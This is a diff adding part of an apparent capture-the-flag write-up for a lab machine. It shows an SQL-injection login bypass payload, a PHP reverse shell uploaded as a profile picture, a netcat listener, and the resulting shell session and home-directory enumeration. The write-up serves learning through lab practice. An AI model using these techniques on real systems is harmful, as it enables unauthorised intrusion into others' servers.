@@ -81,3 +81,40 @@ admin panel.
 using some basic sql injections `' OR 1=1-- -` on the login page and we are able to login.
 ![image](https://user-images.githubusercontent.com/63084488/135785135-432cb9a3-d645-46a4-a1dc-5bd733ebdbed.png)
 
+after looking through the site we can see there is chance to update the profile picture. so lets try to upload php reverse shell.
+then try loging out and log back in to load the profile picture.
+this will give us the shell.
+
+set up a listerner using netcat on port 9001
+
+```bash
+Connection received on 10.10.235.17 46208
+Linux lockdown 4.15.0-151-generic #157-Ubuntu SMP Fri Jul 9 23:07:57 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
+ 02:51:20 up 38 min,  0 users,  load average: 0.00, 0.00, 0.08
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+sh: cannot set terminal process group (1027): Inappropriate ioctl for device
+sh: no job control in this shell
+sh-4.4$ 
+```
+
+we can see too users on home directory . But we dont have the premission inside the directory.
+```bash
+cd /home
+sh-4.4$ ls -la
+ls -la
+total 16
+drwxr-xr-x  4 root   root   4096 May 10 23:47 .
+drwxr-xr-x 24 root   root   4096 Jul 23 15:23 ..
+drwxr-x---  6 cyrus  cyrus  4096 Jul 30 10:50 cyrus
+drwxr-x---  5 maxine maxine 4096 May 11 04:25 maxine
+sh-4.4$ cd cyrus
+cd cyrus
+sh: cd: cyrus: Permission denied
+sh-4.4$ cd maxine
+cd maxine
+sh: cd: maxine: Permission denied
+sh-4.4$ 
+```
+
+
